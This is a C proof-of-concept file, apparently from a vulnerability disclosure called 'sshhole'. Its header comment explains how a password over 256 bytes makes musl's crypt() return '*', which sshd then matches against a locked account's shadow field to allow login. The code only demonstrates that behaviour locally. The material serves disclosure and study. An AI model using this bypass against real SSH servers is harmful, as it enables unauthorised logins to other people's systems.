/*
 * crypt-poc.c — the libc-level primitive behind "sshhole"
 *
 * sshd's pick_salt() hands crypt(3) a borrowed $6$ salt for accounts
 * whose shadow field is '*'. On musl, sha512crypt refuses keys longer
 * than KEY_MAX (256 bytes) and crypt() returns the two-byte string "*"
 * instead of NULL. sshd then strcmp()s that against the shadow field —
 * which IS "*" — and the login succeeds.
 *
 * Build inside the container:
 *   gcc -o /tmp/crypt-poc crypt-poc.c -lcrypt
 * Run:
 *   /tmp/crypt-poc
 */
#define _GNU_SOURCE
#include <crypt.h>
#include <stdio.h>
#include <string.h>

static void show(const char *label, const char *pw, const char *salt)
{
	char *r = crypt(pw, salt);
	printf("%-34s -> %s\n", label, r ? r : "(null)");
}

int main(void)
{
	static char longpw[301];
	memset(longpw, 'A', 300);
	longpw[300] = '\0';

	/* salt shaped like what OpenSSH's pick_salt() extracts:
	 * "$6$<salt>$" borrowed from any sha512crypt account */
	const char *salt = "$6$O9vXBqGtlBeBNkJh$";

	printf("libc: %s\n\n", crypt("x", "xx") ? "crypt() present" : "no crypt");
	show("crypt(\"short\", $6$salt$)", "wrongpassword", salt);
	show("crypt(300 x 'A', $6$salt$)", longpw, salt);
	printf("\nOn musl the second call returns \"*\" — identical to a locked\n");
	printf("shadow field, so sshd's strcmp() accepts it. On glibc it returns\n");
	printf("a real hash and the login fails.\n");
	return 0;
}
